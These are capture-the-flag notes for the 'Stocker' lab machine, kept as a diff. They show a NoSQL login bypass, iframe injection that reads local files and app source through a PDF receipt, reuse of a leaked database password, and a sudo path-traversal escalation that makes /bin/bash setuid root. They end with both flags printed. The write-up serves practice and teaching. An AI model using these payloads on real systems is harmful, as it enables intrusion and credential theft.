@@ -1,0 +1,326 @@
+10.10.11.196
+
+
+http://stocker.htb/
+
+nothing from drectory listing
+
+└─$ wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://stocker.htb/" -H "Host: FUZZ.stocker.htb" --hl 7   
+
+found dev.stocker.htb subdomain
+
+
+http://dev.stocker.htb/login
+
+there is a login form 
+
+It looks like sqli doesn't work 
+
+sqlmap -r login_req.txt -p username --dump
+sqlmap -r login_req.txt -p password --dump
+
+none of the parameters looks injectable
+
+from the request I found:
+
+Cookie: connect.sid=s%3A99cjle1SigdZ8hoTbCurfp1naFmTpc-F.cpByk2n6pY0TlvauDWWOaNMYlOAg%2BBsfCUevDmgpfjI
+
+
+which is a typical cookie for node.js applications
+
+The parameters may be injectable to NoSQL? (usually node.js uses nosql databases but it could also use sql)
+
+https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass
+
+https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf
+
+slide 17 
+
+the second method is not working ( username[%24ne]=toto&password[%24ne]= )
+
+I can try the first one, in json but I have to change the content type
+
+It works! change the content type to application/json
+
+POST /login HTTP/1.1
+Host: dev.stocker.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 55
+Origin: http://dev.stocker.htb
+Connection: close
+Referer: http://dev.stocker.htb/login
+Cookie: connect.sid=s%3A99cjle1SigdZ8hoTbCurfp1naFmTpc-F.cpByk2n6pY0TlvauDWWOaNMYlOAg%2BBsfCUevDmgpfjI
+Upgrade-Insecure-Requests: 1
+
+{"username": {"$ne": null}, "password": {"$ne": null} }
+
+
+
+I get the response:
+
+<p>Found. Redirecting to <a href="/stock">/stock</a></p>
+
+
+fromm this new page I can see in the page inspection:
+
+"/api/products"
+
+fetch("/api/order", {
+        method: "POST",
+        body: JSON.stringify({ basket }),
+        headers: {
+          "Content-Type": "application/json",
+        },
+      })
+        .then((response) => response.json())
+        .then((response) => {
+          if (!response.success) return alert("Something went wrong processing your order!");
+
+          purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);
+
+          $("#order-id").textContent = response.orderId;
+
+          beforePurchase.style.display = "none";
+          afterPurchase.style.display = "";
+          submitPurchase.style.display = "none";
+
+
+I can place an order and then get a receipt:
+
+
+http://dev.stocker.htb/api/po/63c927f2a398bf6406262592
+
+
+the data inside the order are used to generate the receipt 
+
+{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2},{"_id":"638f116eeb060210cbd83a8f","title":"Bin","description":"It's a rubbish bin.","image":"bin.jpg","price":76,"currentStock":15,"__v":0,"amount":1}]}
+
+what I have in the receipt is title, price, amount
+
+Changing the parameters in the request I can change the reipt generated:
+
+I put 
+Cup22222
+in the request
+
+I could try to inject something
+
+"title":"<h1>hello</h1>"
+
+it looks like html is interpreted by the page and gets displayed 
+
+I coould try to use this to read some files on the file system?
+
+https://stackoverflow.com/questions/38978871/how-to-open-a-txt-file-with-a-specific-path-in-html-with-iframe
+
+"title":"<iframe src='file:////etc/passwd' width=1000 height=1000 frameborder=0 id='frame'>",
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
+landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
+angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+
+
+there is a user angoose 
+
+try to read ssh key files:
+
+
+"title":"<iframe src='file:////home/angoose/.ssh/id_rsa' width=1000 height=1000 frameborder=0 id='frame'>",
+
+nothing is displayed so probably the file does not exist or the webapp user doesn't have enogh privileges to read it 
+I could try to retrieve configuration files or code files (like login)
+
+The web server is nginx, maybe I'll find something useful in /etc/nginx/nginx.conf
+and the webapp could be nodejs as noticed before from cookie:
+Cookie: connect.sid=s%3A99cjle1SigdZ8hoTbCurfp1naFmTpc-F.cpByk2n6pY0TlvauDWWOaNMYlOAg%2BBsfCUevDmgpfjI
+
+
+<iframe src='file:////etc/nginx/nginx.conf' width=1000 height=1000 frameborder=0 id='frame'>
+
+I need to add a slider to read all the content in the file
+
+<iframe src='file:////etc/nginx/nginx.conf' style='width:845px;height:400px;max-width:100%;overflow:auto;border:none;padding:0;margin:0 auto;display:block;' id='frame'>
+
+reading various conf file from nginx I wasn't able to find any info about the path of the websites so I will have to guess:
+
+/var/www/html/index.js -> nothing
+/var/www/index.js       -> nothing 
+/var/www/html/dev/index.js -> nothin 
+/var/www/dev/index.js       -> found something:
+
+const express = require("express");
+const mongoose = require("mongoose");
+const session = require("express-session");
+const MongoStore = require("connect-mongo");
+const path = require("path");
+const fs = require("fs");
+const { generatePDF, formatHTML } = require("./pdf.js");
+const { randomBytes, createHash } = require("crypto");
+const app = express();
+const port = 3000;
+// TODO: Configure loading from dotenv for production
+const dbURI =
+"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+app.use(
+session({
+secret: randomBytes(32).toString("hex"),
+resave: false,
+saveUninitialized: true,
+store: MongoStore.create({
+mongoUrl: dbURI,
+}),
+})
+);
+app.use("/static", express.static(__dirname + "/assets"));
+app.get("/", (req, res) => {
+return res.redirect("/login");
+});
+app.get("/api/products", async (req, res) => {
+if (!req.session.user) return res.json([]);
+const products = await mongoose.model("Product").find();
+return res.json(products);
+});
+app.get("/login", (req, res) => {
+if (req.session.user) return res.redirect("/stock");
+return res.sendFile(__dirname + "/templates/login.html");
+});
+app.post("/login", async (req, res) => {
+const { username, password } = req.body;
+if (!username || !password) return res.redirect("/login?
+error=login-error");
+// TODO: Implement hashing
+const user = await mongoose.model("User").findOne({
+username, password });
+if (!user) return res.redirect("/login?error=login-error");
+req.session.user = user.id;
+console.log(req.session);
+return res.redirect("/stock");
+
+
+mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1
+
+password for mongo
+
+maybe password reuse? try to login as angoose:IHeardPassphrasesArePrettySecure
+
+yes!
+
+angoose@stocker:~$ id
+uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
+angoose@stocker:~$ cat user.txt 
+aac4071768522cd665809c643c520389
+angoose@stocker:~$ 
+
+angoose@stocker:~$ sudo -l
+[sudo] password for angoose: 
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+
+I can't write or modify /usr/local/scripts
+
+
+angoose@stocker:/usr/local/scripts$ ls -alrt
+total 32
+-rwxr-x--x  1 root root  793 Dec  6 09:53 findUnshippedOrders.js
+-rwxr-x--x  1 root root 1625 Dec  6 09:53 findAllOrders.js
+-rwxr-x--x  1 root root  245 Dec  6 09:53 creds.js
+-rwxr-x--x  1 root root  623 Dec  6 09:53 schema.js
+-rwxr-x--x  1 root root 1337 Dec  6 09:53 profitThisMonth.js
+drwxr-xr-x  2 root root 4096 Dec  6 10:33 node_modules
+drwxr-xr-x  3 root root 4096 Dec  6 10:33 .
+drwxr-xr-x 11 root root 4096 Dec  6 10:33 ..
+angoose@stocker:/usr/local/scripts$ cd node_modules/
+angoose@stocker:/usr/local/scripts/node_modules$ ls -lart
+total 12
+lrwxrwxrwx 1 root root   34 Dec  6 09:54 mongoose -> ../../../lib/node_modules/mongoose
+-rw-r--r-- 1 root root 1915 Dec  6 09:54 .package-lock.json
+drwxr-xr-x 2 root root 4096 Dec  6 10:33 .
+drwxr-xr-x 3 root root 4096 Dec  6 10:33 ..
+angoose@stocker:/usr/local/scripts/node_modules$ 
+
+
+it uses *.js so I can add everything I want, also ../../../../../ and execute a file everywhere I want 
+
+so I create a file under /home/angoose
+
+
+const subProcess = require('child_process')
+subProcess.exec('chmod u+s /bin/bash', (err, stdout, stderr) => {
+  if (err) {
+    console.error(err)
+    process.exit(1)
+  } else {
+    console.log(`The stdout Buffer from shell: ${stdout.toString()}`)
+    console.log(`The stderr Buffer from shell: ${stderr.toString()}`)
+  }
+})
+
+angoose@stocker:~$ cat exploit.js                                                                                                                                                                                                         
+const subProcess = require('child_process')
+subProcess.exec('chmod u+s /bin/bash', (err, stdout, stderr) => {
+  if (err) {
+    console.error(err)
+    process.exit(1)
+  } else {
+    console.log(`The stdout Buffer from shell: ${stdout.toString()}`)
+    console.log(`The stderr Buffer from shell: ${stderr.toString()}`)
+  }
+})
+angoose@stocker:~$ pwd
+/home/angoose
+
+
+
+angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../../../../home/angoose/exploit.js 
+The stdout Buffer from shell: 
+The stderr Buffer from shell: 
+angoose@stocker:~$ /bin/bash -p
+bash-5.0# id
+uid=1001(angoose) gid=1001(angoose) euid=0(root) groups=1001(angoose)
+bash-5.0# cat /root/root.txt 
+483300e9b43d5a49c7ebc6aba5e2540d
+bash-5.0# 
+
+
